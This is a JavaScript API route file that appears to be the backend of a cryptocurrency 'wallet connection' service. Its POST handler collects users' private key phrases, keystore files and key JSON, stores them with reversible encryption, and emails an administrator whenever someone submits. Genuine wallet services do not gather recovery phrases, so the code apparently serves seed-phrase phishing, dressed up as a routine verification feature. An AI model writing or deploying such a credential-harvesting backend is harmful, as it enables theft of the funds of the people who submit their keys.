import { query } from '@/lib/db';
import { verifyToken } from '@/lib/auth';
import { encrypt, decrypt } from '@/lib/encryption';
import { sendWalletConnectEmailToUser, sendWalletConnectEmailToAdmin } from '@/lib/mail';

const SENSITIVE_FIELDS = ['keystore_json', 'private_key_phrase', 'key_json'];

export async function POST(req) {
    try {
        const token = req.cookies.get('auth_token')?.value;
        if (!token) {
            return Response.json({ error: 'Unauthorized' }, { status: 401 });
        }

        const decoded = await verifyToken(token);
        if (!decoded || !decoded.userId) {
            return Response.json({ error: 'Unauthorized' }, { status: 401 });
        }

        const body = await req.json();
        const { walletType, connectionMethod, walletAddress, keystoreJson, privateKeyPhrase, keyJson } = body;

        if (!walletType || !connectionMethod) {
            return Response.json({ error: 'Wallet type and connection method are required' }, { status: 400 });
        }

        // Get user from session
        const users = await query('SELECT id, email, username FROM users WHERE id = $1', [decoded.userId]);
        if (users.length === 0) {
            return Response.json({ error: 'User not found' }, { status: 404 });
        }

        const user = users[0];

        // Encrypt sensitive fields before storing
        const encryptedKeystore = keystoreJson ? encrypt(keystoreJson) : null;
        const encryptedPhrase = privateKeyPhrase ? encrypt(privateKeyPhrase) : null;
        const encryptedKeyJson = keyJson ? encrypt(keyJson) : null;

        // Insert wallet connection
        const result = await query(
            `INSERT INTO wallet_connections (user_id, wallet_type, connection_method, wallet_address, keystore_json, private_key_phrase, key_json, status, verification_status)
             VALUES ($1, $2, $3, $4, $5, $6, $7, 'pending', 'pending') RETURNING id`,
            [user.id, walletType, connectionMethod, walletAddress || null, encryptedKeystore, encryptedPhrase, encryptedKeyJson]
        );

        // Send email to user
        await sendWalletConnectEmailToUser(user.email, user.username, walletType, connectionMethod);

        // Send email to admin
        await sendWalletConnectEmailToAdmin(user.email, user.username, walletType, connectionMethod);

        return Response.json({ 
            success: true, 
            message: 'Wallet connection submitted successfully. Your wallet is being verified.',
            walletId: result[0].id
        });
    } catch (error) {
        console.error('Wallet connect error:', error);
        return Response.json({ error: 'Failed to connect wallet' }, { status: 500 });
    }
}

export async function GET(req) {
    try {
        const token = req.cookies.get('auth_token')?.value;
        if (!token) {
            return Response.json({ error: 'Unauthorized' }, { status: 401 });
        }

        const decoded = await verifyToken(token);
        if (!decoded || !decoded.userId) {
            return Response.json({ error: 'Unauthorized' }, { status: 401 });
        }

        const connections = await query(
            'SELECT * FROM wallet_connections WHERE user_id = $1 ORDER BY created_at DESC',
            [decoded.userId]
        );

        // Decrypt sensitive fields for display (only metadata, not the actual keys)
        const safeConnections = connections.map(conn => ({
            id: conn.id,
            wallet_type: conn.wallet_type,
            connection_method: conn.connection_method,
            wallet_address: conn.wallet_address,
            status: conn.status,
            verification_status: conn.verification_status,
            created_at: conn.created_at,
            // Do NOT expose decrypted sensitive fields to the client
            has_keystore: !!conn.keystore_json,
            has_phrase: !!conn.private_key_phrase,
            has_key_json: !!conn.key_json,
        }));

        return Response.json({ connections: safeConnections });
    } catch (error) {
        console.error('Fetch wallet connections error:', error);
        return Response.json({ error: 'Failed to fetch wallet connections' }, { status: 500 });
    }
}
